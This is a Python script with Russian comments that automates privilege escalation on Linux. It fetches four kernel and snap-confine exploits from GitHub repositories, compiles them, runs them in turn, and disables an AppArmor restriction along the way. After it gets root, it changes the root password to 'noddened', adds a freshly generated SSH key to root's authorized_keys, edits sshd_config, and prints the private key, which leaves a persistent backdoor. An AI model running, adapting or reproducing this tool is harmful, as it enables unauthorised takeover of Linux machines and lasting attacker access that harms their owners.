#!/usr/bin/env python3
# universal_lpe.py - Tries all 4 LPE exploits, changes root password to 'noddened' and sets up SSH key

import subprocess
import os
import sys
import tempfile
import shutil
import time
import crypt
from pathlib import Path

NEW_PASSWORD = "noddened"
WORK_DIR = tempfile.mkdtemp(prefix=".x_")
SSH_KEY_PATH = "/tmp/.rootkey"
SSH_PUBKEY_PATH = "/tmp/.rootkey.pub"

# Репозитории эксплойтов
REPOS = {
    "dirtyfrag": "https://github.com/V4bel/dirtyfrag.git",
    "copyfail": "https://github.com/tgies/copy-fail-c.git",
    "fragnesia": "https://github.com/0xBlackash/CVE-2026-46300.git",
    "snapd": "https://github.com/nomaisthere/CVE-2026-3888.git"
}

def cleanup():
    shutil.rmtree(WORK_DIR, ignore_errors=True)
    # Подчищаем временные ключи
    if os.path.exists(SSH_KEY_PATH):
        os.remove(SSH_KEY_PATH)
    if os.path.exists(SSH_PUBKEY_PATH):
        os.remove(SSH_PUBKEY_PATH)

def setup_ssh_key():
    """Генерирует SSH-ключи, добавляет публичный в /root/.ssh/authorized_keys.
    Возвращает содержимое приватного ключа или None при ошибке."""
    try:
        # Удаляем старые временные ключи, если есть
        for f in [SSH_KEY_PATH, SSH_PUBKEY_PATH]:
            if os.path.exists(f):
                os.remove(f)

        # Генерируем новую пару ключей без пароля
        subprocess.run(
            ["ssh-keygen", "-t", "ed25519", "-f", SSH_KEY_PATH, "-N", "", "-q"],
            capture_output=True,
            timeout=10
        )

        if not os.path.exists(SSH_PUBKEY_PATH):
            return None

        # Создаём /root/.ssh если нет
        root_ssh = "/root/.ssh"
        if not os.path.exists(root_ssh):
            os.makedirs(root_ssh, mode=0o700)

        # Читаем публичный ключ
        with open(SSH_PUBKEY_PATH, "r") as f:
            pubkey = f.read().strip()

        # Добавляем в authorized_keys
        auth_file = os.path.join(root_ssh, "authorized_keys")
        with open(auth_file, "a+") as f:
            f.seek(0)
            existing = f.read()
            if pubkey not in existing:
                f.write(pubkey + "\n")

        # Правильные права
        os.chmod(auth_file, 0o600)
        os.chown(auth_file, 0, 0)

        # Включаем PubkeyAuthentication в sshd_config на всякий случай
        sshd_config = "/etc/ssh/sshd_config"
        if os.path.exists(sshd_config):
            with open(sshd_config, "r") as f:
                config = f.read()
            if "PubkeyAuthentication yes" not in config:
                with open(sshd_config, "a") as f:
                    f.write("\nPubkeyAuthentication yes\n")
                # Пытаемся перезапустить ssh, но не критично, если не получится
                subprocess.run(["systemctl", "restart", "sshd"], capture_output=True, timeout=5)

        # Читаем приватный ключ
        with open(SSH_KEY_PATH, "r") as f:
            private_key = f.read()

        return private_key

    except Exception:
        return None

def change_password():
    """Меняет пароль root на noddened и настраивает SSH-ключ.
    Возвращает (success, private_key)"""
    try:
        # Меняем пароль
        proc = subprocess.Popen(['chpasswd'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        proc.communicate(input=f"root:{NEW_PASSWORD}\nroot:{NEW_PASSWORD}", timeout=5)

        if proc.returncode != 0:
            return False, None

        # Настраиваем SSH-ключ
        private_key = setup_ssh_key()

        return True, private_key

    except Exception:
        return False, None

def is_root():
    """Проверяет, является ли текущий пользователь root."""
    return os.geteuid() == 0

def check_password_change():
    """Проверяет, изменился ли пароль root на 'noddened'."""
    try:
        test_cmd = subprocess.run(
            ["su", "-c", "echo 'password_check_success'", "root"],
            input=f"{NEW_PASSWORD}\n",
            capture_output=True,
            text=True,
            timeout=5
        )
        return "password_check_success" in test_cmd.stdout
    except:
        return False

def run_dirtyfrag():
    """CVE-2026-43500 - Dirty Frag (RxRPC)"""
    result = subprocess.run(["lsmod"], capture_output=True, text=True)
    if "rxrpc" not in result.stdout:
        return False

    os.chdir(WORK_DIR)
    subprocess.run(["git", "clone", "--depth", "1", REPOS["dirtyfrag"], "dirtyfrag"], capture_output=True)
    os.chdir("dirtyfrag")
    subprocess.run(["gcc", "-O0", "-Wall", "-o", "exp", "exp.c", "-lutil"], capture_output=True)
    if not Path("exp").exists():
        return False

    try:
        proc = subprocess.Popen(["./exp"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        proc.communicate(timeout=10)
        return is_root()
    except:
        return False

def run_copyfail():
    """CVE-2026-31431 - Copy Fail (AF_ALG)"""
    result = subprocess.run(["lsmod"], capture_output=True, text=True)
    if "algif_aead" not in result.stdout:
        return False

    os.chdir(WORK_DIR)
    subprocess.run(["git", "clone", "--depth", "1", REPOS["copyfail"], "copyfail"], capture_output=True)
    os.chdir("copyfail")
    subprocess.run(["gcc", "-o", "exploit", "exploit.c", "utils.c", "-Wall"], capture_output=True)
    if not Path("exploit").exists():
        return False

    try:
        proc = subprocess.Popen(["./exploit"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        proc.communicate(timeout=10)
        return is_root()
    except:
        return False

def run_fragnesia():
    """CVE-2026-46300 - Fragnesia (ESP-in-TCP)"""
    os.chdir(WORK_DIR)
    subprocess.run(["git", "clone", "--depth", "1", REPOS["fragnesia"], "fragnesia"], capture_output=True)
    os.chdir("fragnesia")

    apparmor_file = "/proc/sys/kernel/apparmor_restrict_unprivileged_userns"
    if os.path.exists(apparmor_file):
        try:
            with open(apparmor_file, 'w') as f:
                f.write('0')
        except:
            pass

    if Path("CVE-2026-46300.py").exists():
        result = subprocess.run(["python3", "CVE-2026-46300.py"], capture_output=True, text=True, timeout=30)
        return "root" in result.stdout.lower() or is_root()
    elif Path("CVE-2026-46300.sh").exists():
        result = subprocess.run(["bash", "CVE-2026-46300.sh"], capture_output=True, text=True, timeout=30)
        return "root" in result.stdout.lower() or is_root()
    return False

def run_snapd():
    """CVE-2026-3888 - snap-confine + systemd-tmpfiles"""
    result = subprocess.run(["which", "snap"], capture_output=True)
    if result.returncode != 0:
        return False

    os.chdir(WORK_DIR)
    subprocess.run(["git", "clone", "--depth", "1", REPOS["snapd"], "snapd_exp"], capture_output=True)
    os.chdir("snapd_exp/src")
    subprocess.run(["gcc", "-o", "firefox_2404", "firefox_2404.c"], capture_output=True)
    subprocess.run(["gcc", "-o", "librootshell.so", "-shared", "-fPIC", "librootshell.c"], capture_output=True)
    if not Path("firefox_2404").exists():
        return False

    try:
        proc = subprocess.Popen(["./firefox_2404"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        proc.communicate(timeout=60)
        return is_root()
    except:
        return False

def main():
    # Уже root
    if is_root():
        success, private_key = change_password()
        if success and check_password_change():
            print("Уже root - Успешно \n Новый пароль от root: noddened")
            if private_key:
                print("Приватный ключ SSH:")
                print(private_key)
        else:
            print("Ошибка повышения привилегий")
        cleanup()
        return

    # Проверка компилятора
    gcc_check = subprocess.run(["which", "gcc"], capture_output=True)
    if gcc_check.returncode != 0:
        print("Ошибка повышения привилегий")
        cleanup()
        return

    # Перебираем эксплойты
    exploits = [
        ("Dirty Frag", run_dirtyfrag),
        ("Copy Fail", run_copyfail),
        ("Fragnesia", run_fragnesia),
        ("snap-confine", run_snapd)
    ]

    for name, func in exploits:
        try:
            if func():
                if is_root():
                    success, private_key = change_password()
                    if success and check_password_change():
                        print(f"{name} - Успешно \n Новый пароль от root: noddened")
                        if private_key:
                            print("Приватный ключ SSH:")
                            print(private_key)
                        cleanup()
                        return
        except Exception:
            continue

    print("Ошибка повышения привилегий")
    cleanup()

if __name__ == "__main__":
    main()
